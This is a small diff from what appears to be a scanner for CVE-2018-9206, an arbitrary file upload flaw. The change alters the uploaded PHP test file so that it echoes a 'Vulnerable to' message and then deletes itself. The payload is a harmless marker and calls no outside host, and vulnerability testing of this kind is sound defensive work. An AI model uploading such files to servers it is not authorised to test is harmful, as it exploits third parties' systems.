@@ -23,7 +23,7 @@ OUTPUTS = [
     "{prefix}/server/php/files/nopsec.php"
 ]
 
-SHELL_CONTENT = "<?php echo 'Vulnerable to CVE-2018-9206 on ' . date('Y-m-d h:i:sa'); ?>"
+SHELL_CONTENT = "<?php echo 'Vulnerable to CVE-2018-9206 on ' . date('Y-m-d h:i:sa'); unlink(__FILE__); ?>"
 
 PORTS = {80 : 'http', 8000 : 'http', 8080 : 'http', 443 : 'https', 8443 : 'https'}
 
